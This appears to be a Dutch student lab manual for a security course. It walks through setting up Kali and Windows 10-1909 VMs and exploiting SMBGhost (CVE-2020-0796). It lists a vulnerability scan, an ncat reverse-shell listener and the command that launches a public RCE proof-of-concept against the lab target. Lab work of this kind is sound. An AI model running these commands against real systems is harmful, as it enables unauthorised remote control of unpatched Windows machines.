# Handleiding

SMBGhost Vulnerability  
CVE-2020-0796

Doel: Remote Excecution   
Target: Windows 10-1909  

Team:   
Demi De Fré   
Abdul Rehman Shafaquet    
Arthur Neirynck  

## Deployment stappenplan

### Stap 1: Downloaden ISO & VDI
* Download het .vdi bestand voor de [Kali Linux](https://www.osboxes.org/kali-linux/) VM.  
* Download het .ISO bestand voor de [Windows 10-1909](https://archive.org/download/win-10-1909-english-x-64) VM.  

### Stap 2: Vboxmanage automatisatie script's 
* Open een command prompt naar keuze.
* Run het bash script `./kali.sh` om de Kali Linux VM aan te maken.
* Run het bash script `./windwos1909.sh` om de Windows VM aan te maken.

### Stap 3: Inloggen op de VM's
* Open de Kali en Windows VM
* Kali inloggegevens (default)
* username: osboxes
* wachtwoord: osboxes.org
* Bij de windows zijn er geen inloggegevens nodig.

### Algemeen
Alle informatie en documentatie is beschikbaar op onze github repo:
[Github team](https://github.com/abdulnsh/cybersecurity_vr_opdracht)

## Cheatsheet aanval

### IP-tabel

| VM              | IP Address   |
| ----------------| ------------ |
| Windows 10-1909 | 192.168.1.17 |
| Kali Linux VM   | 192.168.1.20 |

## Inleiding

De scripts die we gebruiken voor de aanval zijn beschikbaar op onze [Github](https://github.com/abdulnsh/cybersecurity_vr_opdracht).  

Hier vermelden we toch voor de zekerheid onze gebruikte bronnen: 
- [RCE-script](https://github.com/jamf/CVE-2020-0796-RCE-POC/tree/master)
- [Vulnerability Scanner](https://github.com/ButrintKomoni/cve-2020-0796)
- [](https://github.com/jiansiting/CVE-2020-0796-Scanner) (Deze hebben we niet echt nodig, maar is er toch voor zekerheid)   

### Stap 1: Vulnerability check
* We controleren eerst of de target (Windows 10-1909) vulnerable is met een [python scanner script](https://github.com/abdulnsh/cybersecurity_vr_opdracht/blob/main/aanval_script/scanner/cve-2020-0796-scanner.py).  
```
┌──(osboxes㉿osboxes)-[~/Desktop/cve-2020-0796]
└─$ python3 cve-2020-0796-scanner.py 192.168.1.17
Vulnerable
```
* We gebruiken het ip adres van de target als parameter.

### Stap 2: Remote excecution uitvoeren
* Juiste target offsets die passen voor slachtoffer zijn windows versie
*we moeten in een terminal (op onze kali linux) `ncat -lvp <port>` runnen, dit zal onze toegang zijn naar onze windows (dit kan zijn ncat -lvp 1234)
*we voeren `SMBleedingGhost.py` uit als volgt : `SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>`

*`target_ip` is onze windows 10 slachtoffer, 192.168.1.17 dus. `reverse_shell_ip` en `reverse_shell_port` zijn de ip address en poort waarop ncat luistert

*in ons geval zou onze code op zoiets lijken dus : `python3 SMBleedingGhost.py 192.168.1.17 192.168.1.20 1234`










